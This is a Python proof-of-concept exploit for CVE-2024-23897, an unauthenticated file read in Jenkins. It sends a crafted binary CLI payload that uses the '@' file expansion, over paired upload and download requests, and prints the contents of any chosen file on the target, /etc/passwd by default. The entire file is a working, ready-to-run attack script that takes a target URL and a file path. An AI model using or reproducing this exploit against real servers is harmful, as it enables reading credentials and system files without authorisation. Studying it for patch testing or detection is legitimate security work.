import requests
import argparse
import uuid
import threading

def parse_args():
	parser = argparse.ArgumentParser(add_help=True, description='This is a POC for CVE-2024-23897 (Jenkins file read)')
	parser.add_argument("-u",dest="url",type=str,required=True, help="Url")
	parser.add_argument("-f",dest="filename",type=str,required=True, help="Filename")
	return parser.parse_args()


class UploadThread(threading.Thread):
	def __init__(self, url, session, payload):
		threading.Thread.__init__(self)
		self.url = url
		self.session = session
		self.payload = payload

	def run(self):
		r = requests.post(f'{self.url}/cli?remoting=false',headers={
			"Session": self.session,
			"Side": "upload",
			"Content-type": "application/octet-stream"
		}, data=self.payload, verify=False, timeout=3)


class DownloadThread(threading.Thread):
	def __init__(self, url, session):
		threading.Thread.__init__(self)
		self.result = None
		self.url = url
		self.session = session

	def run(self):
		r = requests.post(f'{self.url}/cli?remoting=false',headers={
			"Session": self.session,
			"Side": "download",
		}, verify=False, timeout=3)
		self.result = r.text


class CVE_2024_23897:
	def __init__(self, url):
		self.url = url
		self.gen_session = lambda: str(uuid.uuid4())

	def gen_payload(self, path):
		payload = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@'
		payload += path.encode()
		payload += b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
		return payload	

	def read(self, path='/etc/passwd'):
		print(f'[+] Trying to recover {path}')

		session = self.gen_session()
		payload = self.gen_payload(path)

		t1 = UploadThread(self.url, session, payload)
		t2 = DownloadThread(self.url, session)

		t1.start()
		t2.start()

		t1.join()
		t2.join()
		return t2.result


if __name__ == '__main__':
	args = parse_args()

	exp = CVE_2024_23897(url = args.url)
	data = exp.read(args.filename)

	print(f'[+] Data recovered:')
	print(data)
	
